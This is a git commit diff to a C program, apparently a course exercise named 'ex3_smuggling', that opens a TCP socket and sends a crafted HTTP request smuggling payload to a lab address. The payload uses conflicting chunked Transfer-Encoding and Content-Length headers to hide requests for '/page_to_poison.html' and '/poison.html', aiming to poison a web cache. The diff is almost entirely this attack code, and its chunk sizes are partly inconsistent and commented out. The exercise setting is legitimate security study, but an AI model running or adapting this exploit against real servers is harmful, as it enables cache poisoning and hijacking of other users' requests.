1bb85f50252a077d4a7e924b6e95fe218e8c20e7
YousefAGO <97043151+YousefAGO@users.noreply.github.com>
2025-01-21 22:02:12 +0200

    Update ex3_smuggling.c

--- ex3/ex3_smuggling.c
+++ ex3/ex3_smuggling.c
@@ -12,7 +12,16 @@ int main() {
     struct sockaddr_in server_addr;
     char request[1024];
     char buffer[4096];
-
+    char* body =         "\r\n"
+        "33\r\n"
+        "GET /page_to_poison.html HTTP/1.1\r\n" // Smuggled request
+        "19\r\n"
+        "Host: 192.168.1.201\r\n"
+        "22\r\n"
+        "Connection: Keep-Alive\r\n"
+        "\r\n";
+    printf("body length is : %ld\n", strlen(body));
+    
     // Create socket
     sock = socket(AF_INET, SOCK_STREAM, 0);
     if (sock < 0) {
@@ -31,22 +40,33 @@ int main() {
         close(sock);
         return 1;
     }
-
     // 💡 Updated request with Connection: Keep-Alive and TE.CL technique
     snprintf(request, sizeof(request),
-        "POST / HTTP/1.1\r\n"
-        "Host: 192.168.1.202\r\n"
+        "POST /doomle.html HTTP/1.1\r\n"
+        "Host: 192.168.1.201\r\n"
+        "Content-Type: text/html\r\n"
+        "Content-Length: 57\r\n"
         "Transfer-Encoding: chunked\r\n"
-        "Connection: Keep-Alive\r\n"  // Keeps the connection open
+        "Connection: Keep-Alive\r\n"
         "\r\n"
-        "4\r\n"  // First chunk size
-        "abcd\r\n"  // First chunk data
-        "0\r\n"  // End of chunked encoding
-        "\r\n"  // End of first request
-        "GET /poison.html HTTP/1.1\r\n"  // Smuggled request
-        "Host: 192.168.1.202\r\n"
-        "Connection: Keep-Alive\r\n"  // Close after smuggling
-        "\r\n");
+        "21\r\n"
+        "GET /page_to_poison.html HTTP/1.1\r\n"
+        "18\r\n"
+        "Host: 192.168.1.201\r\n0\r\n\r\n"
+        //"24\r\n"
+        "GET /poison.html HTTP/1.1\r\n"
+        "0\r\n\r\n"
+        
+        //"GET /page_to_poison.html HTTP/1.1\r\n"  // Smuggled request
+        //"Host: 192.168.1.201\r\n"
+        //"Connection: Keep-Alive\r\n"  // Close after smuggling
+        //"Something: GET /poison.html HTTP/1.1\r\n"
+        //"\r\n"
+
+// End of first request
+
+        );
+
 
     // Send the malicious request
     if (send(sock, request, strlen(request), 0) < 0) {
@@ -56,7 +76,7 @@ int main() {
     }
 
     // Wait for a response
-    int received = recv(sock, buffer, sizeof(buffer) - 1, 0);
+    int received =recv(sock, buffer, sizeof(buffer) - 1, 0);
     if (received > 0) {
         buffer[received] = '\0';
         printf("Server response:\n%s\n", buffer);
